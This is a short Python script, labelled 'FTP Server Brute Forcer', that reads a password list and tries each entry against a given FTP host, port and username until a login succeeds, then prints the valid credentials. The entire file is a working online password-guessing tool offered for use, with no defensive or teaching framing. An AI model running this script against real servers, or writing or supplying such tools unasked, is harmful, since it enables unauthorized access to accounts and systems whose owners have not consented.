import ftplib
import sys

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="FTP Server Brute Forcer")
    parser.add_argument("host", help="Hostname or IP Address of FTP Server.")
    parser.add_argument("port", help="Port of FTP Server.")
    parser.add_argument("-P", "--passlist", help="File that contains password list on each line.")
    parser.add_argument("-u", "--user", help="Username to bruteforce")

    args = parser.parse_args()
    host = args.host
    port = int(args.port)
    passlist = args.passlist
    user = args.user

    def try_password(password):
        server = ftplib.FTP()
        sys.stdout.write("\n[X] Attempting credentials -> {}:{}\r".format(user, password))
        try:
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            return False
        else:
            sys.stdout.write("\n[>>>>>] Valid password '{}' found for user '{}'!\n".format(password, user))
            return True

    passwords = open(passlist).read().split("\n")
    for password in passwords:
        if try_password(password):
            break
